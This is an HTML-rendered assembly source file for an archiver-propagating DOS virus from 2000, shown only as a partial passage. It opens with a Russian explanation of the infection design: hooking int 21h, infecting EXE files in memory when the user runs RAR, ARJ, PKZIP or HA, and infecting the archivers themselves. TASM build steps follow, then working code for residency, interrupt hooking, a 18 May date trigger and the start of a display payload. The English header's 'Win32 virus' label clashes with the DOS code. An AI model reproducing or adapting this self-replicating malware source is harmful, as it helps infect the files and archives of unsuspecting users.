<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>archiver.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">COMMENT</span><span class="sc0"> </span><span class="sc5">%</span><span class="sc0">

  </span><span class="sc5">PE</span><span class="sc4">-</span><span class="sc5">EXE.CRYPT.</span><span class="sc0"> </span><span class="sc5">A</span><span class="sc0"> </span><span class="sc5">very</span><span class="sc0"> </span><span class="sc5">simple</span><span class="sc0"> </span><span class="sc5">non</span><span class="sc4">-</span><span class="sc5">tsr</span><span class="sc0"> </span><span class="sc5">Win32</span><span class="sc0"> </span><span class="sc5">virus.</span><span class="sc0"> </span><span class="sc5">Scannes</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0">
  </span><span class="sc5">files</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">current</span><span class="sc0"> </span><span class="sc5">directory</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">infects</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc5">appending</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0">
  </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">last</span><span class="sc0"> </span><span class="sc5">section.</span><span class="sc0">

   Вирус</span><span class="sc4">,</span><span class="sc0"> который сейчас перед вами</span><span class="sc4">,</span><span class="sc0"> был написан еще пол года назад</span><span class="sc4">,</span><span class="sc0"> но
полностью доделать и оформить его у меня нашлось время только сейчас</span><span class="sc5">.</span><span class="sc0"> Этот
вирус является реализацией довольно старой идеи</span><span class="sc4">,</span><span class="sc0"> но</span><span class="sc4">,</span><span class="sc0"> видимо из</span><span class="sc4">-</span><span class="sc0">за сложности
алгоритма</span><span class="sc4">,</span><span class="sc0"> других воплощений этой идеи</span><span class="sc4">,</span><span class="sc0"> по моим данным</span><span class="sc4">,</span><span class="sc0"> нет</span><span class="sc5">.</span><span class="sc0"> Итак</span><span class="sc4">,</span><span class="sc0"> в чем же
заключается вся фишка</span><span class="sc10">?</span><span class="sc0"> А дело в том</span><span class="sc4">,</span><span class="sc0"> что вирус ничего на диск не пишет
</span><span class="sc4">(</span><span class="sc0">за исключением ниже оговоренных случаев</span><span class="sc4">)</span><span class="sc5">.</span><span class="sc0"> Но в таком случае возникает
справедливый вопрос</span><span class="sc4">:</span><span class="sc0"> как же тогда вирус размножается</span><span class="sc10">?</span><span class="sc0"> В данной реализации
ему помогают архиваторы </span><span class="sc4">(</span><span class="sc0">хотя могут быть и другие варианты</span><span class="sc4">)</span><span class="sc5">.</span><span class="sc0">
   Теперь по порядку</span><span class="sc5">.</span><span class="sc0"> Сначала отвечу на такой вопрос</span><span class="sc4">:</span><span class="sc0"> как</span><span class="sc4">,</span><span class="sc0"> не изменяя файл</span><span class="sc4">,</span><span class="sc0">
сделать так</span><span class="sc4">,</span><span class="sc0"> чтобы файл казался зараженным</span><span class="sc10">?</span><span class="sc0"> Остаемся резидентно и перехватываем
следующие функции </span><span class="sc2">21</span><span class="sc4">-</span><span class="sc0">го прерывания</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Fh</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc0">чтение каталогов</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc0">чтение из файла</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc0">установка указателя в файле</span><span class="sc4">)</span><span class="sc0">

   Далее мы выполняем действия</span><span class="sc4">,</span><span class="sc0"> обратные действиям </span><span class="sc5">Stealth</span><span class="sc4">-</span><span class="sc0">вирусов</span><span class="sc5">.</span><span class="sc0"> При чтении
каталогов увеличиваем в </span><span class="sc5">DTA</span><span class="sc0"> размер файла</span><span class="sc4">-</span><span class="sc0">жертвы на длину вируса</span><span class="sc5">.</span><span class="sc0"> При чтении из
файла проверяем</span><span class="sc4">,</span><span class="sc0"> где находится указатель и</span><span class="sc4">,</span><span class="sc0"> если он находится на </span><span class="sc5">MZ</span><span class="sc4">-</span><span class="sc5">EXE</span><span class="sc0">
заголовке </span><span class="sc4">(</span><span class="sc0">мы работаем только с </span><span class="sc5">MZ</span><span class="sc4">-</span><span class="sc5">EXE</span><span class="sc0"> файлами</span><span class="sc4">)</span><span class="sc0"> или на предполагаемом месте
расположения вируса в файле </span><span class="sc4">(</span><span class="sc0">в нашем случае это сразу после конца файла</span><span class="sc4">),</span><span class="sc0"> то
подставляем </span><span class="sc8">CX</span><span class="sc0"> байт из </span><span class="sc5">MZ</span><span class="sc4">-</span><span class="sc5">EXE</span><span class="sc0"> заголовка</span><span class="sc4">,</span><span class="sc0"> который тут же генерируем </span><span class="sc4">(</span><span class="sc0">так же</span><span class="sc4">,</span><span class="sc0">
как это делают при обычном заражении</span><span class="sc4">),</span><span class="sc0"> или из кода вируса соответственно</span><span class="sc4">,</span><span class="sc0"> по
адресу </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">DX.</span><span class="sc0"> То есть</span><span class="sc4">,</span><span class="sc0"> мы заражаем не сам файл</span><span class="sc4">,</span><span class="sc0"> а буффер</span><span class="sc4">,</span><span class="sc0"> в который его читают
</span><span class="sc4">(</span><span class="sc0">заражаем файл в памяти</span><span class="sc4">)</span><span class="sc5">.</span><span class="sc0"> Таким образом</span><span class="sc4">,</span><span class="sc0"> программа</span><span class="sc4">,</span><span class="sc0"> прочитавшая файл</span><span class="sc4">,</span><span class="sc0"> получит
его зараженным</span><span class="sc5">.</span><span class="sc0"> Более детальное описание алгоритма приводится отдельно</span><span class="sc5">.</span><span class="sc0">
   Естественно</span><span class="sc4">,</span><span class="sc0"> что перед тем</span><span class="sc4">,</span><span class="sc0"> как выполнять вышеописанные действия</span><span class="sc4">,</span><span class="sc0"> мы сначала
проверяем тип файла </span><span class="sc4">(</span><span class="sc0">он должен быть </span><span class="sc5">MZ</span><span class="sc4">-</span><span class="sc5">EXE</span><span class="sc4">,</span><span class="sc0"> как уже было сказано</span><span class="sc4">)</span><span class="sc0"> и его
пригодность для заражения </span><span class="sc4">(</span><span class="sc0">отсутствие оверлеев</span><span class="sc4">),</span><span class="sc0"> а также делаем проверку на
повторное заражение </span><span class="sc4">(</span><span class="sc0">признак зараженности файла </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">6666h</span><span class="sc0"> в поле контрольной
суммы </span><span class="sc5">MZ</span><span class="sc4">-</span><span class="sc5">EXE</span><span class="sc0"> заголовка</span><span class="sc4">)</span><span class="sc5">.</span><span class="sc0">
   Теперь самое главное</span><span class="sc5">.</span><span class="sc0"> Все</span><span class="sc4">,</span><span class="sc0"> что написано выше</span><span class="sc4">,</span><span class="sc0"> при обычных условиях отключено
и активируется только тогда</span><span class="sc4">,</span><span class="sc0"> когда пользователь запускает архиватор </span><span class="sc4">(</span><span class="sc5">RAR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ARJ</span><span class="sc4">,</span><span class="sc0">
</span><span class="sc5">PKZIP</span><span class="sc0"> или </span><span class="sc5">HA</span><span class="sc4">)</span><span class="sc5">.</span><span class="sc0"> Для этого вирус перехватывает функцию </span><span class="sc2">4Bh</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc0">запуск файла</span><span class="sc4">)</span><span class="sc5">.</span><span class="sc0"> Ясно</span><span class="sc4">,</span><span class="sc0">
что в архивах файлы окажутся зараженными</span><span class="sc4">,</span><span class="sc0"> в то время как на диске они останутся
нетронутыми</span><span class="sc5">.</span><span class="sc0">
   Помимо всего прочего</span><span class="sc4">,</span><span class="sc0"> вирус заражает указанные выше архиваторы при их
запуске </span><span class="sc4">(</span><span class="sc0">это как раз тот единственный случай</span><span class="sc4">,</span><span class="sc0"> когда вирус что</span><span class="sc4">-</span><span class="sc0">то пишет на
диск</span><span class="sc4">)</span><span class="sc5">.</span><span class="sc0"> При заражении архиваторов вирус обрабатывает атрибут </span><span class="sc3">"Только чтение"</span><span class="sc4">,</span><span class="sc0">
не изменяет атрибутов и времени создания файла</span><span class="sc4">,</span><span class="sc0"> а также не глючит на защищенных
от записи дискетах</span><span class="sc5">.</span><span class="sc0">
   Проявление</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc0"> мая вирус устанавливает на </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc0"> свой обработчик</span><span class="sc4">,</span><span class="sc0"> который
создает анимационный эффект с некоторыми шрифтами</span><span class="sc5">.</span><span class="sc0">

                                  </span><span class="sc5">DJ</span><span class="sc0"> </span><span class="sc5">Sadovnikov</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">http</span><span class="sc4">://</span><span class="sc5">i.am</span><span class="sc4">/</span><span class="sc5">djsad</span><span class="sc4">),</span><span class="sc0"> </span><span class="sc2">26.09.2000</span><span class="sc0">

 ══════════════════════════════════════════════════════════════════════════════

               Компилировать с помощью </span><span class="sc5">TASM</span><span class="sc0"> </span><span class="sc2">4.1</span><span class="sc4">+</span><span class="sc0">

                  </span><span class="sc5">tasm</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">m</span><span class="sc0"> </span><span class="sc5">archiver.asm</span><span class="sc0">
                  </span><span class="sc5">tlink</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc2">3</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">x</span><span class="sc0"> </span><span class="sc5">archiver.obj</span><span class="sc0">
                  </span><span class="sc5">del</span><span class="sc0"> </span><span class="sc5">archiver.obj</span><span class="sc0">


               Файлы из архива</span><span class="sc4">:</span><span class="sc0">

                  </span><span class="sc5">archiver.asm</span><span class="sc0"> </span><span class="sc2">23700</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc0">исходник вируса</span><span class="sc4">)</span><span class="sc0">
                  </span><span class="sc5">archiver.exe</span><span class="sc0">  </span><span class="sc2">2100</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc0">бинарник вируса</span><span class="sc4">)</span><span class="sc0">
                  </span><span class="sc5">archiver.doc</span><span class="sc0">  </span><span class="sc2">3300</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc0">описание алгоритма</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">%</span><span class="sc0">









</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

        </span><span class="sc2">.286</span><span class="sc0">
</span><span class="sc5">Code</span><span class="sc0">        </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc9">use16</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">Code</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Msg</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4C00h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">Msg</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Virus has started...$'</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">










</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                                 НАЧАЛО ВИРУСА</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Virus</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Entry</span><span class="sc0">
</span><span class="sc5">Entry</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Entry</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">


</span><span class="sc1">;[Проверяем наличие вируса в памяти]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ABCDh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DCBAh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Exit</span><span class="sc0">


</span><span class="sc1">;[Укорачиваем длину текущего блока памяти]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MemSize</span><span class="sc4">/</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ah</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Exit</span><span class="sc0">


</span><span class="sc1">;[Переставляем int 21h на int 65h]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3521h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2565h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc1">;[Выделяем память для вируса]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MemSize</span><span class="sc4">/</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Exit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc1">;[Помечаем блок памяти как системную область]</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">


</span><span class="sc1">;[Копируем вирус в выделенную память]</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем новый обработчик int 21h]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2521h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Int21h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc1">;[Проверяем системную дату]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0807h</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">71h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">71h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1805h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">


</span><span class="sc1">;[Сохраняем адрес старого обработчика int 1Ch]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">351Ch</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Ofs1Ch</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Seg1Ch</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем новый обработчик int 1Ch]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">251Ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Int1Ch</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">


</span><span class="sc1">;[Отдаем управление зараженной программе]</span><span class="sc0">

</span><span class="sc5">Exit</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldCS</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldSS</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">


        </span><span class="sc6">cli</span><span class="sc0">
</span><span class="sc5">OldSS</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
</span><span class="sc5">OldSP</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">OldIP</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">OldCS</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">










</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                           ОБРАБОТЧИК INT 1Ch</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Int1Ch</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0B800h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Flag1</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">WaitTic</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3C4h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3CEh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">
        </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Font1</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Font1Ofs</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">*</span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Font</span><span class="sc0">

